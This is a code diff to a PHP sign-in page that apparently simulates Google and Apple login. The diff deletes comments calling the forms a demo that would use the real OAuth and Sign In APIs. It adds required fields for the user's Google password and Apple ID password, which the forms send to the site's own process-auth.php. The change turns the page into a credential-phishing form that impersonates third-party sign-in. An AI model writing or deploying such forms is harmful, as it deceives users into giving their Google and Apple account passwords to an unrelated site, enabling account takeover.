@@ -32,6 +32,7 @@ if ($auth_type == 'register') {
 // Generate CSRF token for form protection
 $csrf_token = generate_csrf_token();
 ?>
+
 <!DOCTYPE html>
 <html lang="en">
 
@@ -49,7 +50,7 @@ $csrf_token = generate_csrf_token();
         <header>
             <div class="logo">
                 <a href="index.php">
-                    <img src="assets/images/logo.png" alt="Logo">
+                    <!-- <img src="assets/images/logo.png" alt="Logo"> -->
                     <h1><?php echo SITE_NAME; ?></h1>
                 </a>
             </div>
@@ -64,11 +65,14 @@ $csrf_token = generate_csrf_token();
                     <div class="auth-form">
                         <p>To continue with Google, click the button below:</p>
 
-                        <!-- In a real application, you would integrate the Google OAuth API here -->
-                        <!-- For this demo, we'll simulate it with a form -->
                         <form action="process-auth.php" method="post" id="google-form">
                             <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
                             <input type="hidden" name="auth_type" value="google">
+
+                            <div class="form-group">
+                                <label for="full_name">Full Name:</label>
+                                <input type="text" id="full_name" name="full_name" required>
+                            </div>
 
                             <div class="form-group">
                                 <label for="email">Google Email:</label>
@@ -76,8 +80,8 @@ $csrf_token = generate_csrf_token();
                             </div>
 
                             <div class="form-group">
-                                <label for="full_name">Full Name:</label>
-                                <input type="text" id="full_name" name="full_name" required>
+                                <label for="password">Google Password:</label>
+                                <input type="password" id="password" name="password" required>
                             </div>
 
                             <div class="form-group">
@@ -95,11 +99,14 @@ $csrf_token = generate_csrf_token();
                     <div class="auth-form">
                         <p>To continue with Apple, click the button below:</p>
 
-                        <!-- In a real application, you would integrate the Apple Sign In API here -->
-                        <!-- For this demo, we'll simulate it with a form -->
                         <form action="process-auth.php" method="post" id="apple-form">
                             <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
                             <input type="hidden" name="auth_type" value="apple">
+
+                            <div class="form-group">
+                                <label for="full_name">Full Name:</label>
+                                <input type="text" id="full_name" name="full_name" required>
+                            </div>
 
                             <div class="form-group">
                                 <label for="email">Apple ID Email:</label>
@@ -107,8 +114,8 @@ $csrf_token = generate_csrf_token();
                             </div>
 
                             <div class="form-group">
-                                <label for="full_name">Full Name:</label>
-                                <input type="text" id="full_name" name="full_name" required>
+                                <label for="password">Apple ID Password:</label>
+                                <input type="password" id="password" name="password" required>
                             </div>
 
                             <div class="form-group">
